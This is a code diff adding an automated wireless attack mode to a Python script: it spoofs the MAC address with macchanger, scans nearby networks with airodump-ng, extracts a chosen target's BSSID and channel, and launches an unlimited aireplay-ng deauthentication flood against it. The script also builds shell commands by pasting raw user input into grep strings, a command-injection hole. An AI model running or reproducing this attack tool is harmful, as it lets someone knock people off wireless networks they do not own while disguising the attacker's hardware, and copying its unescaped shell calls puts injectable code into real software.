@@ -30,6 +30,7 @@ def cls():
                                       !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! """)
    os.system('clear')
    print(logo)
+   print("")
  
 
 
@@ -39,8 +40,35 @@ def start():
       cls()
    if(sys.argv[1] == "--a"):#aireplay attack
       cls()
+      print("Listing Wireless cards: ")
+      os.system("ifconfig | grep -e ': ' | sed -e 's/: .*//g' | sed -e 's/^//' > monitor.rmo")
+      os.system('cat -n monitor.rmo')
+      monitor = raw_input("Select you wirelles card fo monitor mode: ")
+      print("")
+   
+      os.system("ifconfig | grep -e ': ' | sed -e 's/: .*//g' | sed -e 's/^//' | grep -n ^ | grep '"+monitor+"' | cut -d: -f2 > monitor.rmo")
+      print("Changing the MAC")
+      os.system("monitor=`cat monitor.rmo` && ifconfig $monitor down")
+      os.system("monitor=`cat monitor.rmo` && macchanger -r $monitor")
+      os.system("monitor=`cat monitor.rmo` && ifconfig $monitor up")
+      print("")
+   
       
+      print("")
+      print("Listing avaliable wireless network for attack: ")
+      os.system("monitor=`cat monitor.rmo` && airodump-ng $monitor -w target")
+      target = raw_input("Select one ESSID for start the attack: ")
+      os.system("cat target-01.csv | grep '"+target+"' > target.rmo")
+      os.system("cat target-01.csv | grep '"+target+"' | awk '{print FS1 $20}' | sed 's/,//g' > tessid.rmo")
+      os.system("cat target-01.csv | grep '"+target+"' | awk '{print FS1 $1}' | sed 's/,//g' > tbssid.rmo")
+      os.system("cat target-01.csv | grep '"+target+"' | awk '{print FS1 $6}' | sed 's/,//g' > tchannel.rmo")
+      print("")
       
+      print("############################# Aireplay attack! ###################################")
+      os.system("monitor=`cat monitor.rmo` && tchannel=`cat tchannel.rmo` && airmon-ng start $monitor $tchannel")
+      os.system("monitor=`cat monitor.rmo` && tbssid=`cat tbssid.rmo` && aireplay-ng -0 0 -a $tbssid $monitor")
+      os.system("monitor=`cat monitor.rmo` && airmon-ng stop $monitor")
+      os.system('rm *.rmo && rm target*')
       
    if(sys.argv[1] == "--m"):#mdk3 attack
       cls()
